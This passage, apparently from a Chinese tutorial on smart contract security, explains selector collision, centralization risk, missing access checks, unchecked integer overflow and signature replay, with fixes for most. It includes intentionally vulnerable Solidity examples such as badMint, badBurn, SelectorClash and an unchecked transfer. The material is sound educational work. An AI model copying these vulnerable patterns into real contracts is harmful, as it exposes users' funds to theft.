+<h1 id="2选择器碰撞">2.选择器碰撞</h1>
+<p>函数选择器是函数签名 <code>&quot;&lt;function name&gt;(&lt;function input types&gt;)&quot;</code> 的哈希值的前<code>4</code>个字节</p>
+<p>具体语法示例：<code>bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;))</code></p>
+<p>函数选择器在<code>solidity</code>中使用非常广泛，比如生成<code>calldata</code>。但由于函数选择器只有<code>4</code>字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器</p>
+<p>比如<code>transferFrom(address,address,uint256)</code>和<code>gasprice_bit_ether(int128)</code>有着相同的选择器：<code>0x23b872dd</code></p>
+<h2 id="21攻击方式">2.1.攻击方式</h2>
+<p>利用合约的漏洞，传入对应方法的函数选择器，达到调用合约内部方法、发起攻击的功能，举个例子：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SelectorClash</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">solved</span><span class="p">;</span> <span class="c1">// 攻击是否成功
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">putCurEpochConPubKeyBytes</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_bytes</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;Not Owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">solved</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">executeCrossChainTx</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_method</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_bytes</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_bytes1</span><span class="p">,</span> <span class="kt">uint64</span> <span class="n">_num</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="kt">bytes4</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">_method</span><span class="p">,</span> <span class="s">&#34;(bytes,bytes,uint64)&#34;</span><span class="p">))),</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="n">_bytes</span><span class="p">,</span> <span class="n">_bytes1</span><span class="p">,</span> <span class="n">_num</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当发起攻击时，<code>executeCrossChainTx()</code>函数调用合约中的<code>putCurEpochConPubKeyBytes()</code>，目标函数的选择器为：<code>0x41973cd9</code>。观察到<code>executeCrossChainTx()</code>中是利用<code>_method</code>参数和<code>&quot;(bytes,bytes,uint64)&quot;</code>作为函数签名计算的选择器</p>
+<p>此时，我们只需要选择恰当的<code>_method</code>，让这里算出的选择器等于<code>0x41973cd9</code>，通过选择器碰撞调用目标函数，这样调用<code>putCurEpochConPubKeyBytes</code>时就符合<code>msg.sender == address(this)</code>校验</p>
+<h2 id="22预防方式">2.2.预防方式</h2>
+<p>函数选择器很容易碰撞成功，这种攻击最好的防范方式就是管理好合约函数的权限，确保拥有特殊权限的合约的函数不能被用户调用</p>
+<h1 id="3中心化风险">3.中心化风险</h1>
+<p>去中心化一直是web3值得骄傲的特性，但很遗憾，实际的web3生态充满着中心化的应用，而这就引入了中心化风险的概念</p>
+<p><code>中心化风险</code>指智能合约的所有权是中心化的，例如合约的<code>owner</code>由一个地址控制，它可以随意修改合约参数，甚至提取用户资金</p>
+<p>中心化的项目存在单点风险，可以被恶意开发者（内鬼）或黑客利用，只需要获取具有控制权限地址的私钥之后，就可以无限铸币，或其他类型方法盗取资金</p>
+<p>还有一种是<code>伪去中心化风险</code>，伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险</p>
+<p>比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大</p>
+<h2 id="31攻击方式">3.1.攻击方式</h2>
+<p>比如有以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/access/Ownable.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Centralization</span> <span class="k">is</span> <span class="n">ERC20</span><span class="p">,</span> <span class="n">Ownable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;Centralization&#34;</span><span class="p">,</span> <span class="s">&#34;Cent&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">exposedAccount</span> <span class="o">=</span> <span class="mh">0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">transferOwnership</span><span class="p">(</span><span class="n">exposedAccount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyOwner</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>owner</code>地址可以任意铸造代币的<code>ERC20</code>合约。当项目内鬼或黑客取得<code>owner</code>的私钥后，可以无限铸币，造成投资人大量损失</p>
+<h2 id="32预防方式">3.2.预防方式</h2>
+<p>1.使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4/7 或 6/9 多签</p>
+<p>2.多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名</p>
+<p>3.使用时间锁控制合约，在黑客或项目内鬼修改合约参数/盗取资产时，项目方和社区有一些时间来应对，将损失最小化</p>
+<h1 id="4权限管理漏洞">4.权限管理漏洞</h1>
+<p>智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失</p>
+<h2 id="41攻击方式">4.1.攻击方式</h2>
+<h3 id="411权限管理漏洞">4.1.1.权限管理漏洞</h3>
+<p>如果合约中特殊功能没有加上权限管理，那么任何人都能铸造大量代币或将合约中的资金提光</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 错误的mint函数，没有限制权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">badMint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果<code>mint</code>函数没有控制权限，那么任何人都可以调用它铸造代币</p>
+<h3 id="412授权检查漏洞">4.1.2.授权检查漏洞</h3>
+<p>授权检查漏洞指的是没有在函数中检查调用者是否拥有足够的授权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 错误的burn函数，没有限制权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">badBurn</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_burn</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以上<code>burn</code>函数因为没有检查调用者的权限或者授权额度，导致攻击者可以任意的销毁其他地址的代币，造成巨大损失</p>
+<h2 id="42预防方式">4.2.预防方式</h2>
+<h3 id="421增加特定的修饰器控制权限">4.2.1.增加特定的修饰器，控制权限</h3>
+<p>比如使用<code>OnlyOwner</code>修饰器，只有合约所有者才能调用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 正确的mint函数，使用 onlyOwner 修饰器限制权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">goodMint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="422在函数的逻辑中确保合约调用者拥有足够的授权">4.2.2.在函数的逻辑中确保合约调用者拥有足够的授权</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 正确的burn函数，如果销毁的不是自己的代币，则会检查授权
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">goodBurn</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="n">account</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_spendAllowance</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_burn</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="5整型溢出">5.整型溢出</h1>
+<p>以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 <code>uint8</code>，只能表示 [0,255] 范围内的数字。如果给 <code>uint8</code> 类型变量的赋值 <code>257</code>，则会上溢（overflow）变为 <code>1</code>；如果给它赋值<code>-1</code>，则会下溢（underflow）变为<code>255</code></p>
+<p>攻击者可以利用这个漏洞让自己的余额瞬间翻倍，<code>solidity 0.8</code>版本后内置了<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/utils/math/SafeMath.sol" target="_blank" rel="noopener noreffer">SafeMath</a>库，该漏洞便很少发生</p>
+<h2 id="51攻击方式">5.1.攻击方式</h2>
+<p>比如以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Token</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="n">_initialSupply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">unchecked</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_owner</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于<code>solidity 0.8</code>之后会自动检查整型溢出错误，溢出时会报错，所以使用<code>unchecked</code>关键字</p>
+<p>在<code>transfer</code>函数中，<code>require(balances[msg.sender] - _value &gt;= 0)</code>校验由于整型溢出，永远都会通过，因此用户可以无限转账</p>
+<h2 id="52预防方式">5.2.预防方式</h2>
+<p>由于<code>solidity 0.8</code>引入了<code>SafeMath</code>，因此几乎不存在这类问题。但在使用<code>unchecked</code>时，一定要确保不会出现整型溢出的漏洞</p>
+<h1 id="6签名重放">6.签名重放</h1>
+<p>在区块链中，数字签名可以用于识别数据签名者和验证数据完整性。发送交易时，用户使用私钥签名交易，使得其他人可以验证交易是由相应账户发出的。智能合约也能利用 <code>ECDSA</code> 算法验证用户将在链下创建的签名，然后执行铸造或转账等逻辑</p>
+<h2 id="61攻击方式">6.1.攻击方式</h2>
+<p>一般来说签名只能使用一次，下一次操作应该重新签名。但<code>签名重放</code>让签名多次使用，这就让攻击者可以去重复做一些<code>transfer</code>、<code>mint</code>操作，从而造成巨大损失</p>
+<p>比如以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/access/Ownable.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SigReplay</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">signer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;SigReplay&#34;</span><span class="p">,</span> <span class="s">&#34;Replay&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">signer</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">badMint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">_msgHash</span> <span class="o">=</span> <span class="n">toEthSignedMessageHash</span><span class="p">(</span><span class="n">getMessageHash</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">verify</span><span class="p">(</span><span class="n">_msgHash</span><span class="p">,</span> <span class="n">signature</span><span class="p">),</span> <span class="s">&#34;Invalid Signer!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getMessageHash</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">toEthSignedMessageHash</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">hash</span><span class="p">)</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x19</span><span class="s">Ethereum Signed Message:</span><span class="se">\n</span><span class="s">32&#34;</span><span class="p">,</span> <span class="n">hash</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_msgHash</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_signature</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">recover</span><span class="p">(</span><span class="n">_msgHash</span><span class="p">,</span> <span class="n">_signature</span><span class="p">)</span> <span class="o">==</span> <span class="n">signer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>badMint</code>方法中，虽然有对<code>消息hash</code>、<code>签名</code>的<code>verify</code>，<code>require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;)</code>。但是没有对<code>signature</code>进行重复性校验，导致同样的签名可以多次使用，无限铸造代币</p>
+<h2 id="62预防方式">6.2.预防方式</h2>
+<h3 id="621记录已经使用过的签名">6.2.1.记录已经使用过的签名</h3>
+<p>比如以上<code>badMint</code>方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">mintedAddress</span><span class="p">;</span>   <span class="c1">// 记录已经mint的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">goodMint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">_msgHash</span> <span class="o">=</span> <span class="n">toEthSignedMessageHash</span><span class="p">(</span><span class="n">getMessageHash</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">verify</span><span class="p">(</span><span class="n">_msgHash</span><span class="p">,</span> <span class="n">signature</span><span class="p">),</span> <span class="s">&#34;Invalid Signer!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 检查该地址是否mint过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">mintedAddress</span><span class="p">[</span><span class="n">to</span><span class="p">],</span> <span class="s">&#34;Already minted&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 记录mint过的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">mintedAddress</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="622将nonce和chainid包含在签名消息中">6.2.2.将nonce和chainid包含在签名消息中</h3>
+<p>这样可以防止普通重放和跨链重放攻击</p>
+<div class="highlight"><div class="chroma">
